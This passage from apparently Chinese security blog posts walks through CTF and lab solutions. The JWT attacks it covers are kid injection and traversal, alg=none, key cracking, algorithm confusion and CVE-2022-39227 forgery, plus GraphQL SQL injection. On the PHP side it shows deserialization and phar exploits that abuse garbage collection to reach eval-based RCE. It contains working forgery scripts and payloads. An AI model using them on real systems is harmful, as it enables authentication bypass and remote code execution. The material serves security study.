kid=$kid&quot;这种，所以它是存在SQL注入漏洞的，示例如下\n#sql注入\n&#123;\n    \"kid\" : \"0 union select 123\"\n&#125;\n此时它的Kid就被我们恶意篡改为123，此时就相当于拿到了Key，可以伪造JWT，实现越权。\n靶场演示靶场地址https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal题目描述\n\n\n\n\n\n\n\n\n\n本实验使用基于 JWT 的机制来处理会话。为了验证签名，服务器使用JWTkid标头中的参数从其文件系统中获取相关密钥\n题目要求\n\n\n\n\n\n\n\n\n\n要解决实验室问题，请伪造一个 JWT，使您可以访问管理面板/admin，然后删除用户carlos。\n题目条件\n\n\n\n\n\n\n\n\n\n您可以使用以下凭据登录到您自己的帐户：wiener:peter\n进入环境后，登录获取JWT安装插件安装后选择New Symmetric Key，生成一个Key接下来修改K参数为AA==，点击确认抓靶场的包点击下面的sign将此时的JWT去替换网站的JWT，再刷新网站成功越权简单说一下这里的原理：这里其实就是利用了kid的目录遍历攻击，我们将kid参数指向标准文件/dev/null，此时我们再利用bp的工具设置一个空的签名密钥，就实现了越权，成功得到管理员权限。\n同时，这个Kid是Headers的一部分，Headers其实还有两个不常用的参数，即Jwk和Jku，这两个的话也是存在漏洞的，他们的攻击方式同Kid是较为相似的，所以这里不再去演示如何攻击。靶场环境如下，有兴趣的师傅可以看看。https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injectionhttps://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection\nJWT攻击实例CVE-2022-39227这个的话并没有给出具体的POC，但是官方在commit中最下方给出了测试代码https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9具体代码如下所示\n\"\"\" Test claim forgery vulnerability fix \"\"\"\nfrom datetime import timedelta\nfrom json import loads, dumps\nfrom test.common import generated_keys\nfrom test import python_jwt as jwt\nfrom pyvows import Vows, expect\nfrom jwcrypto.common import base64url_decode, base64url_encode\n\n@Vows.batch\nclass ForgedClaims(Vows.Context):\n    \"\"\" Check we get an error when payload is forged using mix of compact and JSON formats \"\"\"\n    def topic(self):\n        \"\"\" Generate token \"\"\"\n        payload = &#123;'sub': 'alice'&#125;\n        return jwt.generate_jwt(payload, generated_keys['PS256'], 'PS256', timedelta(minutes=60))\n\n    class PolyglotToken(Vows.Context):\n        \"\"\" Make a forged token \"\"\"\n        def topic(self, topic):\n            \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"\n            [header, payload, signature] = topic.split('.')\n            parsed_payload = loads(base64url_decode(payload))\n            parsed_payload['sub'] = 'bob'\n            parsed_payload['exp'] = 2000000000\n            fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))\n            return '&#123;\"  ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"&#125;'\n\n        class Verify(Vows.Context):\n            \"\"\" Check the forged token fails to verify \"\"\"\n            @Vows.capture_error\n            def topic(self, topic):\n                \"\"\" Verify the forged token \"\"\"\n                return jwt.verify_jwt(topic, generated_keys['PS256'], ['PS256'])\n\n            def token_should_not_verify(self, r):\n                \"\"\" Check the token doesn't verify due to mixed format being detected \"\"\"\n                expect(r).to_be_an_error()\n                expect(str(r)).to_equal('invalid JWT format')\n重点在中间部分，也就是这里\ndef topic(self, topic):\n            \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"\n            [header, payload, signature] = topic.split('.')\n            parsed_payload = loads(base64url_decode(payload))\n            parsed_payload['sub'] = 'bob'\n            parsed_payload['exp'] = 2000000000\n            fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))\n            return '&#123;\"  ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"&#125;'\n可以看到这里的话首先是对JWT进行了拆分，我们知道JWT的格式是xxx.yyy.zzz，这个以.来分离，那就是把三部分拆分开来，分别赋值给了header、payload和signature，接下来将进行了base64URL以及json解码的payload赋值给了parsed_payload，而后将新内容sub=bob以及exp=2000000000放入了parsed_payload中，将进行过Base64编码和json编码的parsed_payload赋值给了fake_payload ，最终生成的JWT格式如下\n&#123;\" header.fake_payload.\":\"\",\"protected\":\"header\", \"payload\":\"payload\",\"signature\":\"signature\"&#125;\n此时就完成了JWT的伪造。\n那么这个漏洞是如何产生的呢？接下来我们看一下源文件。查看python_jwt/__init__.py文件首先看到 header, claims, _ = jwt.split(&#39;.&#39;)，它按.进行拆分，如何分别将三部分赋值给headers,claims以及_。接下来就是对头部进行解码，而后检验头部算法，后面也是校验属性的，接下来走到JWS这里\nif pub_key: #验证是否传入密钥\n     token = JWS()\n     token.allowed_algs = allowed_algs\n     token.deserialize(jwt, pub_key) # 传入整个用户的JWT，JWS对JWT进行反序列化处理\n     parsed_claims = json_decode(token.payload) # JWS对传入部分进行json解码\n跟进反序列化，看它是怎么做的\n这里的话就是首先尝试对传入的JWT进行解析，我们知道这里传入的是完整的原始JWT，而非拆分后的某个部分，JWT的格式是xxx.yyy.zzz这种，而json能解析的是&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;这种格式的，所以它无疑会走向except ValueError这里，然后它对值进行拆分，分别赋给protected、payload和signature，然后就将o赋值给了self.objects，这里的话还有一个verify(key,alg)函数，我们跟进一下这里可以看到它其实是对JWT的各部分内容进行了一个检验，它这里检验的是原来的完整的JWT，所以这个肯定是没有问题的，这个验证肯定是可以通过的。\n我们此时回到__init__.py发现这里在校验过后，后面都没有再用到token这个，后面是对header和claims中的一些参数进行校验，然后将parsed_header和parsed_claims值返回了。这里就是问题所在， 在对整个JWT进行校验过后，没有返回校验过的数据，而是返回一开始进行点分过后的数据。\n我们的恶意payload如下所示此时拆分后他一直在校验的是后面的灰色部分，这部分是原始的JWT，校验肯定是可以通过的，而我们最终返回的数据是前面的forged_payload,所以无论前面怎么添加，怎么替换，校验都是可以通过的。此时你再去看官方给出的测试代码就可以理解它的思路了。\nCTF实战CTFshow系列Web345打开靶场，进入环境看一下源代码提示了admin界面，先记着。同时刚刚发现cookie含有JWT，放入网站https://jwt.io/中查看一下加密方式为空加密，所以这里的话，我们base64解码一下，然后直接修改sub为admin，再进行base64编码，放入cookie中即可，接下来访问admin界面\nweb346这里进入环境后，接下来进入靶场，看一下JWT，用解密网站解密一下\n发现有了加密格式，然后这里存在一种漏洞就是可以把加密方式换成空加密来绕过，但是这个网站是不能直接修改的，我们这里可以借助python脚本实现，脚本如下所示\nimport time\nimport jwt\n\n# payload\ntoken_dict=&#123;\n  \"iss\": \"admin\",\n  \"iat\": 1668871293,\n  \"exp\": 1668878493,\n  \"nbf\": 1668871293,\n  \"sub\": \"admin\",\n  \"jti\": \"9892b9d99098ba229891bedcfa856b61\"\n&#125;\n\n# headers\nheaders = &#123;\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n&#125;\n\njwt_token = jwt.encode(token_dict,  # payload, 有效载体 \n\t\t\t\t\t key='',\n                       headers=headers,  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)\n \t\t\t\t\t   algorithm=\"none\",  # 指明签名算法方式, 默认也是HS256\n                       )  # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str\n\nprint(jwt_token)\n\n\n\n\n\n\n\n\n\n\n\n注:这里安装jwt模块的时候，安装的模块是PyJWT模块，同时不要给脚本名字命名为jwt.py，否则运行脚本时就会发生报错。\n\n接下来运行脚本得到JWT\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2ODg3MTI5MywiZXhwIjoxNjY4ODc4NDkzLCJuYmYiOjE2Njg4NzEyOTMsInN1YiI6ImFkbWluIiwianRpIjoiOTg5MmI5ZDk5MDk4YmEyMjk4OTFiZWRjZmE4NTZiNjEifQ.\n去靶场中替换一下，同时访问admin界面\nWeb347提示弱口令，这里应该说的是密钥，先记着进入环境后找到JWT去对应网站解码HS256加密方式，我们这里的话需要猜解一下密钥，然后修改才有效，既然提示了弱口令，那就可以试试123456这种，修改sub为admin，得到新JWT后去靶场中修改JWT，然后访问admin界面\nWeb348题目提示爆破，这里就需要先介绍一个爆破工具了，链接如下https://github.com/brendan-rius/c-jwt-cracker安装方式也很简单\n1、git clone https://github.com/brendan-rius/c-jwt-cracker #下载\n2、make #编译\n3、./jwtcrack JWT #使用\n这里将靶场中的JWT放入其中爆破出密钥为aaab，接下来方法就同上，在解码网站中，修改sub为admin，同时添加密钥为aaab，然后拿着得到的新JWT，去替换网站的JWT，再去访问admin界面即可。\nWeb349题目给了一个附件，内容如下\n/* GET home page. */\nrouter.get('/', function(req, res, next) &#123;\n  res.type('html');\n  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');\n  var token = jwt.sign(&#123; user: 'user' &#125;, privateKey, &#123; algorithm: 'RS256' &#125;);\n  res.cookie('auth',token);\n  res.end('where is flag?');\n  \n&#125;);\n \nrouter.post('/',function(req,res,next)&#123;\n\tvar flag=\"flag_here\";\n\tres.type('html');\n\tvar auth = req.cookies.auth;\n\tvar cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key\n\tjwt.verify(auth, cert, function(err, decoded) &#123;\n\t  if(decoded.user==='admin')&#123;\n\t  \tres.end(flag);\n\t  &#125;else&#123;\n\t  \tres.end('you are not admin');\n\t  &#125;\n\t&#125;);\n&#125;);\n这里发现可以获取公钥和私钥，RSA是用私钥加密，公钥解密，那么我们这里有私钥了，就可以自己写内容，然后用私钥加密，接下来用公钥解密就是我们伪造的内容，所以接下来访问url /private.key获取私钥，然后写个小脚本即可\nimport jwt\npublic = open('private.key', 'r').read()\npayload=&#123;\"user\":\"admin\"&#125;\nprint(jwt.encode(payload, key=public, algorithm='RS256'))\n接下来替换JWT，然后post访问\nweb350题目给了附件，在里面发现公钥这里的话应该考察的就是算法修改攻击，然后我们这里修改算法为HS256,而后用公钥加密，脚本如下\nconst jwt = require('jsonwebtoken');\nvar fs = require('fs');\nvar privateKey = fs.readFileSync('public.key');\nvar token = jwt.sign(&#123; user: 'admin' &#125;, privateKey, &#123; algorithm: 'HS256' &#125;);\nconsole.log(token)\n运行脚本需要安装jsonwebtoken库得到JWT后替换一下，然后post发包即可获取flag\n[祥云杯2022]FunWeb\n\n\n\n\n\n\n\n\n注：因为这道题没有复现环境了，所以我这里的部分图片是来源于网上，参考的是X1r0z大师傅的https://exp10it.cn/\n进入环境后是个注册界面，接下来随便注册账号后进行登录发现上方是有两个功能点的抓获取成绩包后发现这里提示no admin同时发现JWT，想到这里可能需要伪造JWT，JWT最近新出的漏洞是CVE-2022-39227。那么我们就可以尝试用这个漏洞来进行伪造JWT，伪造JWT脚本如下所示\nfrom datetime import timedelta\nfrom json import loads, dumps\nfrom jwcrypto.common import base64url_decode, base64url_encode\n\ndef topic(topic):\n    \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"\n    [header, payload, signature] = topic.split('.')#点分\n    parsed_payload = loads(base64url_decode(payload))#解码\n    parsed_payload['is_admin'] = 1#伪造\n    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))#编码\n    return '&#123;\"  ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"&#125;'#生成恶意载荷\ntoken = topic('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMzcwMzAsImlhdCI6MTY2NzEzNjczMCwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJ4YWxlR2dadl9BbDBRd1ZLLUgxb0p3IiwibmJmIjoxNjY3MTM2NzMwLCJwYXNzd29yZCI6IjEyMyIsInVzZXJuYW1lIjoiMTIzIn0.YnE5tK1noCJjultwUN0L1nwT8RnaU0XjYi5iio2EgbY7HtGNkSy_pOsnRl37Y5RJvdfdfWTDCzDdiz2B6Ehb1st5Fa35p2d99wzH4GzqfWfH5zfFer0HkQ3mIPnLi_9zFiZ4mQCOLJO9RBL4lD5zHVTJxEDrESlbaAbVOMqPRBf0Z8mon1PjP8UIBfDd4RDlIl9wthO-NlNaAUp45woswLe9YfRAQxN47qrLPje7qNnHVJczvvxR4-zlW0W7ahmYwODfS-KFp8AC80xgMCnrCbSR0_Iy1nsiCEO8w2y3BEcqvflOOVt_lazJv34M5e28q0czbLXAETSzpvW4lVSr7g')\nprint(token)\n接下来想到我们抓的包的文件名是graphql，而且还有POST参数，可能存在graphql注入。https://www.leavesongs.com/content/files/slides/GraphQL.pdf而后使用 getscoreusingnamehahaha 方法查询表结构。\n&#123;\"query\": \"\"\"&#123; getscoreusingnamehahaha(name: \"null' union select group_concat(sql) FROM sqlite_master; --\")&#123; score name  &#125; &#125;\"\"\"&#125;\n返回结果如下\nCREATE TABLE users(\n   ID INTEGER PRIMARY KEY,\n   NAME TEXT NOT NULL,  \n   PASSWORD TEXT NOT NULL,\n   SCORE TEXT NOT Null   \n)\n因此可以用这个来查询admin用户成绩，构造最终payload如下。\nimport json\nfrom jwcrypto.common import base64url_decode, base64url_encode\nimport httpx\n\nsession = httpx.Client(base_url=\"http://eci-2zeavdwsk859vkrseg75.cloudeci1.ichunqiu.com/\")\nsession.post(\"/signin\", json=&#123;\n    \"username\": \"test\",\n    \"password\": \"111\"\n    &#125;\n)\n_ = session.cookies.get(\"token\")\n[header, payload, signature] = _.split('.')\nparsed_payload = json.loads(base64url_decode(payload))\nparsed_payload['is_admin'] = 1\nfake_payload = base64url_encode((json.dumps(parsed_payload, separators=(',', ':'))))\nforged_jwt = '&#123;\"  ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"&#125;'\nsession.cookies.delete(\"token\")\nsession.cookies.set(\"token\", forged_jwt)\n\ndata = &#123;\"query\": \"\"\"&#123; getscoreusingnamehahaha(name: \"null' union select password FROM users WHERE name='admin'; --\")&#123; score name  &#125; &#125;\"\"\"&#125;\nresponse = session.post(\"/graphql\", data=data)\nprint(response.text)\n得到密码后去登录即可得到flag\n[CISCN2019 华北赛区 Day1 Web2]ikun进入后发现有登录和注册界面，常规操作先注册后登录提示要买到lv6，下划后发现可以买等级这里没有lv6，点击下一页看看仍然没有找到lv6，但发现参数是GET型传参这意味着我们可以写个小脚本来查找lv6所在位置发现lv3对应的代码是lv3.png，那么lv6对应的就是lv6.png脚本如下\nimport time\nimport requests\nurl = \"http://8e197801-2f87-4e36-aee6-a2390b0f391e.node4.buuoj.cn:81/shop?page=\"\nfor i in range(1,300):\n    res = requests.get(url+str(i))\n    time.sleep(0.5)\n    if \"lv6.png\" in res.text:\n        print(i)\n        break\n\n181页，找到后发现价格是天价，买不起这里抓包看一下发现可以修改折扣，把这个discount修改为0.00000000000001然后发包跳转到了另一个界面但无权限访问再抓包发现JWT，解码一下（解码网站https://jwt.io/）我们这里想实现修改root为admin，需要有密钥，爆破密钥可以用工具c-jwt-cracker得到，链接如下https://github.com/brendan-rius/c-jwt-cracker破解后得到密钥为1Kun抓包，将得到的值赋给JWT，再发包接下来就是读取源码，然后进行Python反序列化获取最终flag，这里不再演示。\n后言JWT的靶场有很多个，我这里也只是利用了CTFhub和portswig等来进行演示，还有一些靶场例如https://jwt-lab.herokuapp.com/challenges也是比较好的，但鉴于考察点相似，这里不再演示，有兴趣的师傅可以自行尝试。然后还有就是这里的CVE漏洞的分析我主要参考了我们战队lemon大师傅的讲解，大家也可以看一下哇，视频链接如下https://www.bilibili.com/video/BV15d4y1F7i3最后的话本人也只是一个小白，如果有问题还请各位大师傅多多指教。\n参考文献https://www.freebuf.com/articles/web/337347.htmlhttps://codex.lemonprefect.cn/https://jwt.io/introduction/https://portswigger.net/web-security/jwthttps://www.anquanke.com/post/id/145540#h3-10https://xz.aliyun.com/t/2338https://xz.aliyun.com/t/9376#toc-6https://xz.aliyun.com/t/6776#toc-6https://www.4hou.com/posts/zlK2https://forum.butian.net/share/1990https://www.cnblogs.com/backlion/p/16699442.html\n","slug":"浅析JWT Attack","date":"2022-11-27T06:58:30.000Z","categories_index":"WEB知识","tags_index":"JWT","author_index":"quan9i"},{"id":"6a30ccf7eba1a3b7e415165a3f83319a","title":"浅析PHP GC垃圾回收机制","content":"声明文章首发于先知社区https://xz.aliyun.com/t/11843\n前言上周战队知识分享时，H3018大师傅讲了PHP GC回收机制的利用，学会了如何去绕过抛出异常。H3018大师傅讲述的很清楚，大家有兴趣的可以去看一下哇，链接如下https://www.bilibili.com/video/BV16g411s7CH/这里没有怎么涉及底层原理，只是将我自己的见解简述一下，希望能对正在学习PHP反序列化的师傅有所帮助。\nGC什么是GCGc，全称Garbage collection，即垃圾回收机制。在PHP中有这个GC机制\nPHP中的GC在PHP中，使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为NULL，或者没有任何指针指向时，它就会被变成垃圾，被GC机制自动回收掉那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被GC机制回收，在回收的过程中，它会自动触发_destruct方法，而这也就是我们绕过抛出异常的关键点。\n上文说到PHP是使用引用计数来进行管理的，接下来简单说一下。\n引用计数当我们PHP创建一个变量时，这个变量会被存储在一个名为zval的变量容器中。在这个zval变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。\n第一个字节名为is_ref，是bool值，它用来标识这个变量是否是属于引用集合。PHP引擎通过这个字节来区分普通变量和引用变量，由于PHP允许用户使用&amp;来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。\n第二个字节是refcount，它用来表示指向zval变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。 \n看接下来的这个例子\n&lt;?php\n$a = \"new string\"; \nxdebug_debug_zval('a'); //用于查看变量a的zval变量容器的内容\n?>\n\n我们可以看到这里定义了一个变量$a，生成了类型为String和值为new string的变量容器，而对于两个额外的字节，is_ref和refcount，我们这里可以看到是不存在引用的，所以is_ref的值应该是false，而refcount是表示变量个数的，那么这里就应该是1，接下来我们验证一下接下来我们添加一个引用\n&lt;?php\n&lt;?php\n$a=\"new string\"; \n$b =&amp;$a;\nxdebug_debug_zval('a');\n?>\n\n按照之前的思路，每生成一个变量就有一个zval记录其类型和值以及两个额外字节，那我们这里的话a的refcount应该是1，is_ref应该是true，接下来我们验证一下哎，结果不同于我们所想的，这是为什么呢？因为同一变量容器被变量a和变量b关联，当没必要时,php不会去复制已生成的变量容器。所以这一个zval容器存储了a和b两个变量，就使得refcount的值为2.\n接下来说一下容器的销毁这个事。变量容器在refcount变成0时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了unset()函数,refcount就会减1。看个例子\n&lt;?php\n$a=\"new string\"; \n$b =&amp;$a;\n$c =&amp;$b;\nxdebug_debug_zval('a');\nunset($b,$c);\nxdebug_debug_zval('a');\n?>\n\n按照刚刚所说，那么这里的首次输出的is_ref应该是true，refcount为3。第二次输出的is_ref值是什么呢，我们可以看到引用$a的变量$b和$c都被unset了，所以这里的is_ref应该是false，也是因为unset，这里的refcount应该从3变成了1，接下来验证一下\nGC在PHP 反序列化中的利用GC如果在PHP反序列化中生效，那它就会直接触发_destruct方法，接下来以例子来演示。\ndemo首先来看变量被unset函数处理的情况\n&lt;?php\nhighlight_file(__FILE__); \nerror_reporting(0); \nclass test&#123; \n    public $num; \n    public function __construct($num) &#123;\n        $this->num = $num; echo $this->num.\"__construct\".\"&lt;/br>\"; \n    &#125;\n    public function __destruct()&#123;\n        echo $this->num.\"__destruct()\".\"&lt;/br>\"; \n    &#125;\n    &#125;\n$a = new test(1); \nunset($a);\n$b = new test(2); \n$c = new test(3); \n\n这个是一种方法，还有一种方法，如下。我们知道当对象为NULL时也是可以触发_destruct的，所以我们这里的话来试一下反序列化一个数组，然后写入第一个索引为对象，将第二个赋值为0，看一下能否触发。(原理我感觉应该是给第一个对象赋值为0键时，此时又将0赋值给了另一个，就相当于它失去了引用，被视为垃圾给回收了)demo如下\n&lt;?php\nshow_source(__FILE__);\n$flag = \"flag\";\nclass B &#123;\n  function __destruct() &#123;\n    global $flag;\n    echo $flag;\n  &#125;\n&#125;\n$a = unserialize($_GET['1']);\nthrow new Exception('你想干什么');\n\n我们可以看到这里在反序列化后就抛出异常了，如果按照正常的话，是无法触发_destruct的，我们按照先前所想，这里先反序列化一个数组\n&lt;?php\nshow_source(__FILE__);\n\nclass B &#123;\n  function __destruct() &#123;\n    global $flag;\n    echo $flag;\n  &#125;\n&#125;\n$a=array(new B,0);\n\necho serialize($a);\n\n得到序列化文本如下\na:2:&#123;i:0;O:1:\"B\":0:&#123;&#125;i:1;i:0;&#125;\n对象类型:长度:&#123;类型:长度;类型:长度:类名:值类型:长度;类型:长度;&#125;\n数组:长度为2::&#123;int型:长度0;类:长度为1:类名为\"B\":值为0 int型:值为1：int型;值为0\n\n接下来我们按照我们所想，将第二个索引置空，就可以触发GC回收机制，因此修改序列化文本为\na:2:&#123;i:0;O:1:\"B\":0:&#123;&#125;i:0;i:0;&#125;\n\n去尝试一下成功触发，看到这里也就知道了大致的思路这里可以看到也是成功提前触发了_destruct，因为如果正常情况的话，有异常抛出就无法再触发_destruct了，而这个思路也是我们在CTF中绕过异常的一个方法。\nGc在Phar反序列化中的利用Gc在Phar反序列化中类似于PHP反序列化，也是当遇到抛出异常时，可以借用上面的方法来实现绕过，下面以demo来简单讲解一下。\ndemo&lt;?php \nhighlight_file(__FILE__); \nclass Test&#123; \n    public $code; \n    public function __destruct()&#123; \n        eval($this -> code); \n        &#125; \n&#125;\n$filename = $_GET['filename']; \necho file_get_contents($filename); \nthrow new Error(\"Garbage collection\"); \n?>\n\n看到file_get_contents函数和类，就想到Phar反序列化，所以接下来尝试借助file_get_contents方法来进行反序列化(因为这里只是本地测试一下，所以不再设置文件上传那些，直接将生成的Phar文件放置本地进行利用了)。构造Exp如下\n&lt;?php \nclass test&#123;\n    public $code= \"phpinfo();\";\n&#125;\n$a = new test();\n$c = array($a,0); \n$b = new Phar('1.phar',0);//后缀名必须为phar\n$b->startBuffering();//开始缓冲 Phar 写操作\n$b->setMetadata($c);//自定义的meta-data存入manifest\n$b->setStub(\"&lt;?php __HALT_COMPILER();?>\");//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测\n$b->addFromString(\"test.txt\",\"test\");//添加要压缩的文件\n$b->stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘\n?>\n\n\n\n\n\n\n\n\n\n\n注：需要去检查一下php.ini中的phar.readonly选项，如果是On，需要修改为Off。否则会报错，无法生成phar文件小Tip: 这里如果有师傅不懂为什么这样写，可以学一下Phar反序列化，我之前也写过一篇关于Phar反序列化的文章，师傅们可以参考一下https://tttang.com/archive/1732/\n用010editor打开phar文件可以发现i:1，按照我们之前的思路，我们这里将i:1修改成i:0就可以绕过抛出异常，但在Phar文件中，我们是不能任意修改数据的，否则就会因为签名错误而导致文件出错，不过签名是可以进行伪造的，所以我们先将1.phar中的i:1修改为i:0，接下来利用脚本使得签名正确。脚本如下\nimport gzip\nfrom hashlib import sha1\nwith open('D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\html\\\\1.phar', 'rb') as file:\n    f = file.read() \ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型以及GBMB标识\nnewf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)\nopen(\"2.phar\",\"wb\").write(newf)\n\n打开2.phar文件查看一下变成i:0且文件正常，接下来利用phar伪协议包含这个文件\n$filename=phar://2.phar\n\n可以发现成功输出了phpinfo。\nCTF实战例题1这道题是H3018大师傅在知识分享时的例题，在这里引用一下，源码如下\n&lt;?php \nhighlight_file(__FILE__); \nerror_reporting(0); \nclass cg0&#123; \n    public $num; \n    public function __destruct()&#123; \n        echo $this->num.\"hello __destruct\"; \n        &#125; \n    &#125;\nclass cg1&#123; \n    public $string; \n    public function __toString() &#123; \n        echo \"hello __toString\"; \n        $this->string->flag(); \n        &#125; \n    &#125;\nclass cg2&#123; \n    public $cmd; \n    public function flag()&#123; \n        echo \"hello __flag()\"; \n        eval($this->cmd); \n    &#125; \n&#125;\n$a=unserialize($_GET['code']); \nthrow new Exception(\"Garbage collection\"); \n?>\n\n这道题的话思路比较简单\n1、首先调用__destrcut，然后通过num参数触发__tostring\n2、给string参数赋值，调用cg2的flag方法\n3、给cmd参数赋值，实现RCE\n\n但我们会发现这里首先要用到的就是__destruct，而代码末尾带有throw new Exception(&quot;Garbage collection&quot;);，即异常抛出，所以我们首先需要解决的就是如何绕过他，上文在讲GC中的PHP反序列化时,demo已经给出了方法，即先传值给数组，而后将第二个索引置空即可，因此我们这里按照平常思路，先构造出payload\n&lt;?php \nhighlight_file(__FILE__); \nerror_reporting(0); \nclass cg0&#123; \n    public $num;\n&#125; \nclass cg1&#123; \n    public $string; \n&#125;\nclass cg2&#123; \n    public $cmd; \n&#125;\n$a = new cg0();\n$a->num=new cg1();\n$a->num->string=new cg2();\n$a->num->string->cmd=\"phpinfo();\";\n$b=array($a,0);\necho serialize($b);\n\n得到\na:2:&#123;i:0;O:3:\"cg0\":1:&#123;s:3:\"num\";O:3:\"cg1\":1:&#123;s:6:\"string\";O:3:\"cg2\":1:&#123;s:3:\"cmd\";s:10:\"phpinfo();\";&#125;&#125;&#125;i:1;i:0;&#125;\n\n将i:1修改为i:0\na:2:&#123;i:0;O:3:\"cg0\":1:&#123;s:3:\"num\";O:3:\"cg1\":1:&#123;s:6:\"string\";O:3:\"cg2\":1:&#123;s:3:\"cmd\";s:10:\"phpinfo();\";&#125;&#125;&#125;i:0;i:0;&#125;\n\n接下来去尝试一下成功触发phpinfo()\nCTFShow[卷王杯]easy unserialize源码如下\n&lt;?php\n/**\n * @Author: F10wers_13eiCheng\n * @Date:   2022-02-01 11:25:02\n * @Last Modified by:   F10wers_13eiCheng\n * @Last Modified time: 2022-02-07 15:08:18\n */\ninclude(\"./HappyYear.php\");\n\nclass one &#123;\n    public $object;\n\n    public function MeMeMe() &#123;\n        array_walk($this, function($fn, $prev)&#123;\n            if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") &#123;\n                global $talk;\n                echo \"$talk\".\"&lt;/br>\";\n                global $flag;\n                echo $flag;\n            &#125;\n        &#125;);\n    &#125;\n\n    public function __destruct() &#123;\n        @$this->object->add();\n    &#125;\n\n    public function __toString() &#123;\n        return $this->object->string;\n    &#125;\n&#125;\n\nclass second &#123;\n    protected $filename;\n\n    protected function addMe() &#123;\n        return \"Wow you have sovled\".$this->filename;\n    &#125;\n\n    public function __call($func, $args) &#123;\n        call_user_func([$this, $func.\"Me\"], $args);\n    &#125;\n&#125;\n\nclass third &#123;\n    private $string;\n\n    public function __construct($string) &#123;\n        $this->string = $string;\n    &#125;\n\n    public function __get($name) &#123;\n        $var = $this->$name;\n        $var[$name]();\n    &#125;\n&#125;\n\nif (isset($_GET[\"ctfshow\"])) &#123;\n    $a=unserialize($_GET['ctfshow']);\n    throw new Exception(\"高一新生报道\");\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n\n简单梳理一下思路，触发MeMeMe方法为最终目标，以_destruct为起点，绕过抛出异常的方式同之前即可接下来看一下它的大致流程首先触发_destruct，那这里的add()无疑是让我们触发_call魔法方法，因此接下来到_call这里，发现这里拼接了Me，那它肯定就指向了addMe()这个方法，接下来看到$this-&gt;filename，想到触发_toString魔术方法，接下来根进_toString方法，发现object-&gt;string，那么这个的话就是触发_get方法了，因此接着看get()魔术方法，这个时候就有一个问题，怎么通过  $var[$name]();来进入one类的MeMeMe方法，我们这里可以控制$var的值，当给它传值为数组，内容为类和方法时，就可成功触发类中的方法，所以我们这里给$var赋值为[new one(),MeMeMe]即可，此时还有一个问题，就是这个MeMeMe中的function($fn, $prev)如何理解，接下来我们本地测试一下发现这个$fn是变量值，而$prev则是变量名，因此这里我们新增一个变量名为year_parm，且其值为Happy_func即可绕过if语句，接下来就可以去写Exp了\n&lt;?php\n/**\n * @Author: F10wers_13eiCheng\n * @Date:   2022-02-01 11:25:02\n * @Last Modified by:   F10wers_13eiCheng\n * @Last Modified time: 2022-02-07 15:08:18\n */\ninclude(\"./HappyYear.php\");\n\nclass one &#123;\n    public $year_parm=array(\"Happy_func\");\n    public $object;\n    \n\n    public function MeMeMe() &#123;\n        array_walk($this, function($fn, $prev)&#123;\n            if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") &#123;\n                global $talk;\n                echo \"$talk\".\"&lt;/br>\";\n                global $flag;\n                echo $flag;\n            &#125;\n        &#125;);\n    &#125;\n\n    public function __destruct() &#123;\n        @$this->object->add();\n    &#125;\n\n    public function __toString() &#123;\n        return $this->object->string;\n    &#125;\n&#125;\n\nclass second &#123;\n    public $filename;\n\n    protected function addMe() &#123;\n        return \"Wow you have sovled\".$this->filename;\n    &#125;\n\n    public function __call($func, $args) &#123;\n        call_user_func([$this, $func.\"Me\"], $args);\n    &#125;\n&#125;\n\nclass third &#123;\n    private $string;\n\n    public function __construct($string) &#123;\n        $this->string = $string;\n    &#125;\n\n    public function __get($name) &#123;\n        $var = $this->$name;\n        $var[$name]();\n    &#125;\n&#125;\n\n$a=new one();\n$a->object=new second();\n$a->object->filename=new one();\n$a->object->filename->object=new third(array(\"string\"=>[new one(),\"MeMeMe\"]));\n$b = array($a,NULL);\necho 